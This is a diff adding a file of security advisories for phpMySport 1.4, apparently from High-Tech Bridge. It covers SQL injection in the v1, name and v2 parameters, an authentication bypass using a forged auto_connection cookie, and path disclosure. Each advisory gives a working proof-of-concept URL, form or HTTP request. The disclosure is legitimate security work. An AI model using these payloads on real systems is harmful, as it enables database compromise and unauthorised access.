@@ -1,0 +1,115 @@
+Vulnerability ID: HTB22770
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_phpmysport.html
+Product: phpMySport
+Vendor: phpMySport ( http://phpmysport.sourceforge.net/ )
+Vulnerable Version: 1.4
+Vendor Notification: 21 December 2010
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "v1" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+http://[host]/index.php?r=news&v1=123%27%20union%20select%201,2,3,4,5,6,@@version,8,9,10,11,12,13,14,15,16,17%20--%201
+
+-----------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22771
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_phpmysport_1.html
+Product: phpMySport
+Vendor: phpMySport ( http://phpmysport.sourceforge.net/ ) 
+Vulnerable Version: 1.4
+Vendor Notification: 21 December 2010 
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "name" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+<form action="http://[host]/index.php?r=member&v1=member_list" method="post" name="main" >
+<input type="hidden" name="name" value="123' union select 1,2,3,4,5,6,7,@@version,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 -- 1"/>
+<input name="page" value="" type="hidden">
+<input name="tri" value="name" type="hidden">
+<input name="ordre" value="asc" type="hidden">
+<input type="submit" value="submit" name="submit" />
+</form>
+
+-----------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22772
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_phpmysport_2.html
+Product: phpMySport
+Vendor: phpMySport ( http://phpmysport.sourceforge.net/ )
+Vulnerable Version: 1.4
+Vendor Notification: 21 December 2010
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "v2" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+http://[host]/index.php?r=member&v1=view&v2=123%27%20union%20select%201,2,3,4,@@version,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%201
+
+-----------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22774
+Reference: http://www.htbridge.ch/advisory/authentication_bypass_in_phpmysport.html
+Product: phpMySport
+Vendor: phpMySport ( http://phpmysport.sourceforge.net/ ) 
+Vulnerable Version: 1.4
+Vendor Notification: 21 December 2010 
+Vulnerability Type: Authentication bypass
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input. Attacker can bypass authentication.
+
+The following PoC is available:
+
+
+POST /index.php?r=member&v1=login HTTP/1.1
+Cookie: auto_connection=1; cle=1;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+login=&pass=&x=9&y=10
+
+-----------------------------------------------------------------------------------------------------------------------
+Vulnerability ID: HTB22773
+Reference: http://www.htbridge.ch/advisory/path_disclousure_in_phpmysport.html
+Product: phpMySport
+Vendor: phpMySport ( http://phpmysport.sourceforge.net/ ) 
+Vulnerable Version: 1.4
+Vendor Notification: 21 December 2010 
+Vulnerability Type: Path disclosure
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/administration/home.php" & "/administration/include.php" & "/administration/configuration.php" scripts, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+The following PoC is available:
+
+
+http://[host]/administration/include.php
+http://[host]/administration/home.php
+http://[host]/administration/configuration.php
